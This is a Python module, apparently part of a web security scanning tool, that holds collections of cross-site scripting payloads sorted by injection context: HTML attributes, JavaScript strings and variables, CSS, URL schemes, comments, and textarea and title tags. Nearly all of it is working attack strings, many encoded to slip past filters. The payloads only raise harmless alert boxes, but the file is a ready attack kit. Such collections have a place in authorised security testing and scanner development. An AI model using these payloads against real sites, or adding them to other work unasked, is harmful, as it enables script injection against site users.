#!/usr/bin/env python3

"""
Context-Specific XSS Payloads

Payloads tailored for specific HTML/JavaScript contexts.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class ContextSpecificPayloads:
    """Context-specific XSS payload collection"""
    
    @staticmethod
    def get_html_attribute_payloads() -> List[str]:
        """HTML attribute context payloads"""
        return [
            # Breaking out of quotes
            '" onmouseover="alert(1)" "',
            '\' onmouseover=\'alert(1)\' \'',
            '" onfocus="alert(1)" autofocus="',
            '\' onfocus=\'alert(1)\' autofocus=\'',
            '" onclick="alert(1)" "',
            '\' onclick=\'alert(1)\' \'',
            
            # No quotes needed
            ' onmouseover=alert(1) ',
            ' onclick=alert(1) ',
            ' onfocus=alert(1) autofocus ',
            ' onload=alert(1) ',
            ' onerror=alert(1) ',
            
            # Mixed quotes
            '" onmouseover=\'alert(1)\' "',
            '\' onmouseover="alert(1)" \'',
            '` onmouseover=alert(1) `',
            
            # URL contexts
            'javascript:alert(1)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:eval("alert(1)")',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
        ]
    
    @staticmethod
    def get_javascript_string_payloads() -> List[str]:
        """JavaScript string context payloads"""
        return [
            # Breaking out of strings
            '\';alert(1);//',
            '\";alert(1);//',
            '`;alert(1);//',
            '\';alert(1);/*',
            '\";alert(1);/*',
            '`;alert(1);/*',
            
            # String concatenation
            '\'+alert(1)+\'',
            '\"+alert(1)+\"',
            '`+alert(1)+`',
            '\'+alert(String.fromCharCode(88,83,83))+\'',
            
            # Template literals
            '${alert(1)}',
            '${alert(String.fromCharCode(88,83,83))}',
            '${eval("alert(1)")}',
            '${prompt(1)}',
            '${confirm(1)}',
            
            # Escape sequences
            '\\u0027;alert(1);//',
            '\\x27;alert(1);//',
            '\\047;alert(1);//',
            '\\\';alert(1);//',
            
            # Multi-line
            '\n\';alert(1);//',
            '\r\';alert(1);//',
            '\r\n\';alert(1);//',
        ]
    
    @staticmethod
    def get_javascript_variable_payloads() -> List[str]:
        """JavaScript variable context payloads"""
        return [
            # Direct assignment
            'alert(1)',
            'prompt(1)',
            'confirm(1)',
            'console.log("XSS")',
            
            # Object method calls
            'window.alert(1)',
            'document.body.innerHTML="XSS"',
            'location.href="javascript:alert(1)"',
            'eval("alert(1)")',
            
            # Constructor calls
            'new Function("alert(1)")()',
            'Array.constructor.constructor("alert(1)")()',
            'Object.constructor.constructor("alert(1)")()',
            
            # Mathematical expressions
            'alert(1*1)',
            'alert(1+0)',
            'alert(1-0)',
            'alert(1/1)',
            'alert(1%2)',
            
            # Logical expressions
            'alert(1&&1)',
            'alert(1||0)',
            'alert(!0)',
            'alert(!!1)',
        ]
    
    @staticmethod
    def get_css_context_payloads() -> List[str]:
        """CSS context payloads"""
        return [
            # Expression (IE)
            'expression(alert(1))',
            'expression(alert(String.fromCharCode(88,83,83)))',
            'expression(prompt(1))',
            'expression(confirm(1))',
            
            # URL functions
            'url(javascript:alert(1))',
            'url("javascript:alert(1)")',
            'url(\'javascript:alert(1)\')',
            'url(data:text/html,<script>alert(1)</script>)',
            
            # Import and fonts
            '@import "javascript:alert(1)"',
            '@import url(javascript:alert(1))',
            'src:url(javascript:alert(1))',
            
            # Breaking out of CSS
            '}</style><script>alert(1)</script><style>',
            '/*</style><script>alert(1)</script><style>/*',
            '*/</style><script>alert(1)</script><style>/*',
            
            # CSS animations with JavaScript
            'animation:xss 1s;@keyframes xss{from{transform:translateX(expression(alert(1)))}}',
            'transition:all 1s expression(alert(1))',
        ]
    
    @staticmethod
    def get_url_context_payloads() -> List[str]:
        """URL context payloads"""
        return [
            # Protocol handlers
            'javascript:alert(1)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:eval("alert(1)")',
            'javascript:prompt(1)',
            'javascript:confirm(1)',
            'vbscript:alert(1)',
            'livescript:alert(1)',
            'mocha:alert(1)',
            
            # Data URLs
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html,<svg onload=alert(1)>',
            'data:text/html,<img src=x onerror=alert(1)>',
            'data:text/html,<body onload=alert(1)>',
            
            # URL encoding
            'javascript:alert%281%29',
            'javascript:alert%28String.fromCharCode%2888,83,83%29%29',
            'javascript:%61%6C%65%72%74%28%31%29',
            
            # Unicode encoding
            'javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)',
            'javascript:\\x61\\x6C\\x65\\x72\\x74(1)',
            
            # Hash fragments
            '#javascript:alert(1)',
            '#<script>alert(1)</script>',
            '#<svg onload=alert(1)>',
        ]
    
    @staticmethod
    def get_comment_context_payloads() -> List[str]:
        """HTML/XML comment context payloads"""
        return [
            # Breaking out of comments
            '--><script>alert(1)</script><!--',
            '--!><script>alert(1)</script><!--',
            '--><svg onload=alert(1)><!--',
            '--><img src=x onerror=alert(1)><!--',
            
            # CDATA sections
            ']]><script>alert(1)</script><![CDATA[',
            ']]><svg onload=alert(1)><![CDATA[',
            
            # Conditional comments (IE)
            '--><script>alert(1)</script><!--[if IE]>',
            '--><script>alert(1)</script><![endif]-->',
            
            # Multi-line comments
            '*/alert(1);/*',
            '*/</script><script>alert(1)</script>/*',
            '*/<script>alert(1)</script>/*',
        ]
    
    @staticmethod
    def get_textarea_context_payloads() -> List[str]:
        """Textarea context payloads"""
        return [
            # Breaking out of textarea
            '</textarea><script>alert(1)</script><textarea>',
            '</textarea><svg onload=alert(1)><textarea>',
            '</textarea><img src=x onerror=alert(1)><textarea>',
            '</textarea><body onload=alert(1)><textarea>',
            
            # Case variations
            '</TEXTAREA><script>alert(1)</script><TEXTAREA>',
            '</TextArea><script>alert(1)</script><TextArea>',
            
            # With attributes
            '</textarea><script>alert(1)</script><textarea disabled>',
            '</textarea><script>alert(1)</script><textarea readonly>',
        ]
    
    @staticmethod
    def get_title_context_payloads() -> List[str]:
        """Title tag context payloads"""
        return [
            # Breaking out of title
            '</title><script>alert(1)</script><title>',
            '</title><svg onload=alert(1)><title>',
            '</title><img src=x onerror=alert(1)><title>',
            '</title><body onload=alert(1)><title>',
            
            # Case variations
            '</TITLE><script>alert(1)</script><TITLE>',
            '</Title><script>alert(1)</script><Title>',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all context-specific XSS payloads"""
        payloads = []
        payloads.extend(ContextSpecificPayloads.get_html_attribute_payloads())
        payloads.extend(ContextSpecificPayloads.get_javascript_string_payloads())
        payloads.extend(ContextSpecificPayloads.get_javascript_variable_payloads())
        payloads.extend(ContextSpecificPayloads.get_css_context_payloads())
        payloads.extend(ContextSpecificPayloads.get_url_context_payloads())
        payloads.extend(ContextSpecificPayloads.get_comment_context_payloads())
        payloads.extend(ContextSpecificPayloads.get_textarea_context_payloads())
        payloads.extend(ContextSpecificPayloads.get_title_context_payloads())
        return payloads